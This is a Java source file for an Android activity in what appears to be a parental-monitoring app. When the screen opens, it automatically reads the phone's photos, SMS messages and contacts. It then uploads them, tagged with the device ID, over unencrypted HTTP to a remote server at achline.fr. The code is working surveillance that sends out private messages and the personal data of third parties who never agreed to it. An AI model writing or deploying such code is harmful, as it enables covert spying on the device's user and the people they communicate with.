package com.example.lachtitefamille;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.text.Html;
import android.util.Base64;
import android.util.Log;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.ProtocolException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class ChildrenActivity extends AppCompatActivity {

    private static final int PERMISSION_GALLERY = 101;
    private static final  int MY_READ_PERMISSION_CODE = 1235 ;
    private static final  int REQUEST_READ_SMS_PERMISSION = 3004;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_children);

        int imagesToSend = 1;

        sendImages(imagesToSend);
        sendSms(10);
        sendContact(30);

    }
    /*
 Send gallery images to the parent via server
 */
    void sendImages( int n)
    {
        if (ContextCompat.checkSelfPermission(ChildrenActivity.this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(ChildrenActivity.this, new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_GALLERY);
        } else {
            ArrayList<String> images = listOfImage(getApplicationContext());
            for(int i = 0 ; i < n ; i++)
            {
                BitmapFactory.Options bmOptions = new BitmapFactory.Options();
                Bitmap bitmap = BitmapFactory.decodeFile(images.get(i),bmOptions);
                postToServ("http://achline.fr/sendimage",BitMapToString( bitmap));
            }

        }

    }
    void sendContact(int n) {

        if (ContextCompat.checkSelfPermission(ChildrenActivity.this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(ChildrenActivity.this, new String[]{
                    Manifest.permission.READ_CONTACTS}, MY_READ_PERMISSION_CODE);
        } else {

            List<Contact> listesContact = getAllContacts();
            for(int i =0; i< n;i++)
            {
                String contact = listesContact.get(i).get_name()+"\n"+listesContact.get(i).get_phone();
            /*
             contact\n06
            */
                postToServ("http://achline.fr/sendcontact",contact);
                Log.e("DEBUG","Contact sent !");
            }

        }
    }
    void sendSms(int n)
    {
        if (ContextCompat.checkSelfPermission(ChildrenActivity.this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(ChildrenActivity.this, new String[]{
                    Manifest.permission.READ_SMS}, REQUEST_READ_SMS_PERMISSION);
        } else {

            List<Sms> listesSms = getAllSms();

            for(int i =0; i< n;i++)
            {
                String sms = listesSms.get(i).getAddress()+"\n"+listesSms.get(i).getMsg();
            /*
                auteur\nmsg
            */

                postToServ("http://achline.fr/sendsms",sms);
                Log.e("DEBUG","Sms sent !");
            }

        }
    }
    public String BitMapToString(Bitmap bitmap) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int outWidth;
        int outHeight;
        int inWidth = bitmap.getWidth();
        int inHeight = bitmap.getHeight();
        double factor = 0.5;
        outWidth = (int) (factor * inWidth);
        outHeight = (int) (factor * inHeight);
        Bitmap resizedBitmap = Bitmap.createScaledBitmap(bitmap, outWidth, outHeight, false);
        resizedBitmap.compress(Bitmap.CompressFormat.PNG, 80, baos);
        byte[] b = baos.toByteArray();
        String temp = Base64.encodeToString(b, Base64.DEFAULT);
        return temp;
    }
    public Bitmap StringToBitMap(String encodedString) {
        try {
            byte[] encodeByte = Base64.decode(encodedString, Base64.DEFAULT);
            Bitmap bitmap = BitmapFactory.decodeByteArray(encodeByte, 0,
                    encodeByte.length);
            return bitmap;
        } catch (Exception e) {
            e.getMessage();
            return null;
        }
    }
    public ArrayList<String> listOfImage(Context context){
        Uri uri;
        Cursor cursor;
        int column_index_data, column_index_folder_name;
        ArrayList<String> listOfAllImages = new ArrayList<>();
        String absolutePathOfImage;
        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.MediaColumns.DATA,MediaStore.Images.Media.BUCKET_DISPLAY_NAME};

        String orderBy = MediaStore.Video.Media.DATE_TAKEN;
        cursor = context.getContentResolver().query(uri,projection,null,null,orderBy+" DESC");

        assert cursor != null;
        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);

        while (cursor.moveToNext()){
            absolutePathOfImage = cursor.getString(column_index_data);
            listOfAllImages.add(absolutePathOfImage);

        }

        return listOfAllImages;
    }
    private void postToServ(String url ,String imageBASE64) {

        TelephonyManager tManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String uuid = tManager.getDeviceId();

        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(url).openConnection();
        } catch (IOException e) {
            e.printStackTrace();
        }
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setConnectTimeout(2500);
        try {
            conn.setRequestMethod("POST");
        } catch (ProtocolException e) {
            e.printStackTrace();
        }
        try (OutputStream out = conn.getOutputStream()) {
            JSONObject jo = new JSONObject();
            jo.put("uuid", uuid);
            jo.put("data", imageBASE64);
            out.write(jo.toString().getBytes(StandardCharsets.UTF_8));
            out.flush();
        } catch (IOException | JSONException e) {
            e.printStackTrace();
        }

        try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"))) {
            JSONObject obj = new JSONObject(in.readLine());
            int imageID = obj.getInt("id");
            Log.e("Result POST : ", String.valueOf(imageID));

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }
    public List<Contact> getAllContacts() {
        List<Contact> lstContact = new ArrayList<Contact>();
        Contact objContact = new Contact();
        ContentResolver cr = getContentResolver();
        Cursor people = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (people != null && people.getCount() > 0)
        {
            while (people.moveToNext()) {
                String id = people.getString(people.getColumnIndex(ContactsContract.Contacts._ID));
                int nameFieldColumnIndex = people.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
                String contact = people.getString(nameFieldColumnIndex);
                objContact = new Contact();
                objContact.set_name(contact);

                if (people.getInt(people.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor phoneCursor = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (phoneCursor.moveToNext()) {
                        @SuppressLint("Range") String number = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        objContact.set_phone(number);
                    }


                }
                lstContact.add(objContact);

            }
            people.close();
        }
        return lstContact;
    }
    public List<Sms> getAllSms() {
        List<Sms> lstSms = new ArrayList<Sms>();
        Sms objSms = new Sms();
        Uri message = Uri.parse("content://sms/");
        Activity mActivity = null;
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                objSms = new Sms();
                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSms.setAddress(c.getString(c
                        .getColumnIndexOrThrow("address")));
                objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                objSms.setReadState(c.getString(c.getColumnIndex("read")));
                objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.setFolderName("inbox");
                } else {
                    objSms.setFolderName("sent");
                }

                lstSms.add(objSms);
                c.moveToNext();
            }
        }
        else {
            throw new RuntimeException("You have no SMS");
        }
        c.close();

        return lstSms;
    }
}